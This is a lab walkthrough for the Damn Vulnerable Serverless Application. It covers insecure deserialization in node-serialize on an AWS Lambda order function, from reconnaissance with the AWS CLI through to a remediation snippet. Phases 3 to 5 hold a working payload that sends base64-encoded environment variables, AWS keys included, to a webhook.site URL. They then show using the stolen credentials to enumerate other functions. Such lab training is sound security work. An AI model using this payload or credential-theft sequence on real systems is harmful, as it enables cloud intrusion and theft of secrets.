# Lesson 1: Remote Code Execution via Insecure Deserialization

This guide provides a comprehensive walkthrough for replicating an **Insecure Deserialization** attack within the **Damn Vulnerable Serverless Application (DVSA)**. By exploiting the `node-serialize` library, we will achieve Remote Code Execution (RCE) on an AWS Lambda function to exfiltrate environment variables and move laterally through the cloud environment.

-----

## 📋 Prerequisites

Before starting, ensure you have the following tools configured:

  * **AWS CLI**: Configured with basic user permissions.
  * **Burp Suite**: Community or Professional edition.
  * **Browser**: Configured to proxy traffic through Burp.
  * **Webhook.site**: For receiving exfiltrated data.
  * **CyberChef**: For decoding Base64 payloads.

-----

## 🛠️ Phase 1: Reconnaissance & Authentication

First, we need to identify our targets and obtain a valid session token to interact with the API.

### 1\. Discover Cognito User Pool

Run the following command to find the user pool associated with the application:

```bash
aws cognito-idp list-user-pools --max-results 10
```

*Note the `Id` (e.g., `us-east-1_vZY6XMozc`).*

### 2\. Get Cognito Client ID

Identify the client ID for the specific user pool:

```bash
aws cognito-idp list-user-pool-clients --user-pool-id <YOUR_USER_POOL_ID>
```

### 3\. Obtain Access Token

Authenticate using your credentials to get a Bearer token:

```bash
TOKEN=$(aws cognito-idp admin-initiate-auth \
  --auth-flow ADMIN_NO_SRP_AUTH \
  --user-pool-id <YOUR_USER_POOL_ID> \
  --client-id <YOUR_CLIENT_ID> \
  --auth-parameters USERNAME=<email>,PASSWORD=<password> \
  --query 'AuthenticationResult.AccessToken' \
  --output text)

echo $TOKEN
```

-----

## 🔍 Phase 2: API Discovery

We need the endpoint for the `DVSA-ORDER-MANAGER` function.

### 1\. Locate API Gateway URL

Find the REST API ID and the deployment stage:

```bash
aws apigateway get-rest-apis
aws apigateway get-stages --rest-api-id <API_ID>
```

**Target URL:** `https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order`

[Image of AWS API Gateway to Lambda architecture]

-----

## 🚀 Phase 3: Exploitation (The Injection)

We will use Burp Suite to intercept a legitimate request and inject our malicious payload.

### 1\. Intercept the Request

1.  Open the DVSA application in your proxied browser.
2.  Navigate to the **Orders** tab.
3.  In Burp Suite (**Proxy \> Intercept**), ensure Intercept is **ON**.
4.  Refresh the page. When the `POST /order` request appears, right-click and select **Send to Repeater**.

### 2\. Craft the RCE Payload

The vulnerability exists because the `action` parameter is passed to `unserialize()`. We use the `_$$ND_FUNC$$_` prefix to trigger an IIFE (Immediately Invoked Function Expression).

**The Logic:**
We want to stringify `process.env` (which contains AWS keys), encode it to Base64 (to avoid breaking the URL), and send it to our Webhook.

**The Payload:**

```javascript
"_$$ND_FUNC$$_function(){var h=require('https');h.get('https://webhook.site/<YOUR_ID>?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));}()"
```

### 3\. Modify and Send in Repeater

In the Repeater tab, update the JSON body:

```json
{
  "action": "_$$ND_FUNC$$_function(){var h=require('https');h.get('https://webhook.site/<YOUR_ID>?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));}()",
  "cart-id": "123"
}
```

Hit **Send**.

-----

## 🔓 Phase 4: Exfiltration & Decoding

### 1\. Capture the Data

Go to your [Webhook.site](https://www.google.com/search?q=https://webhook.site) dashboard. You should see a new incoming **GET** request. The query string (after the `?`) is your Base64 encoded environment data.

### 2\. Decode via CyberChef

1.  Copy the long string from Webhook.site.
2.  Open **CyberChef**.
3.  Use the **From Base64** recipe.
4.  Use the **JSON Beautify** recipe.

**Extracted Credentials:**
Look for `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.

-----

## 🏃 Phase 5: Lateral Movement

Now that we have the Lambda's temporary credentials, we can act as the Lambda service itself.

### 1\. Assume the Role

```bash
export AWS_ACCESS_KEY_ID=<STOLEN_KEY>
export AWS_SECRET_ACCESS_KEY=<STOLEN_SECRET>
export AWS_SESSION_TOKEN=<STOLEN_TOKEN>

aws sts get-caller-identity
```

### 2\. Enumerate Other Functions

Since this role often has broad permissions, list other functions in the account:

```bash
aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName'
```

-----

## 🛡️ Remediation

The root cause is the use of `node-serialize` on untrusted user input.

### Vulnerable Code (`order-manager.js`)

```javascript
const serialize = require('node-serialize');
var req = serialize.unserialize(event.body); // DANGEROUS
```

### Secure Fix

Replace the library with standard, safe JSON parsing:

```javascript
// Remove node-serialize
var req = JSON.parse(event.body); // SAFE
```

-----

## 📝 Summary Checklist

  - [x] Obtained Cognito Token.
  - [ ] Intercepted `POST /order` in Burp.
  - [ ] Injected `_$$ND_FUNC$$_` payload.
  - [ ] Decoded `process.env` in CyberChef.
  - [ ] Verified IAM role assumption via AWS CLI.
